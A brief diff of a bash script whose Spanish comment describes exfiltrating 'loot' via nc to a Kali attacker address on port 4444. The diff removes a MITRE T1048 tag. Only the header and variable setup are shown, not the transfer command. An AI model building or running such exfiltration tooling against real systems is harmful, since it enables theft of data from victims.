@@ -1,7 +1,6 @@
 #!/bin/bash
 
 # Exfiltra loot via nc. Verifica si puerto abierto.
-# MITRE: T1048.
 
 KALI_IP=${1:-192.168.1.50}
 PORT=${2:-4444}
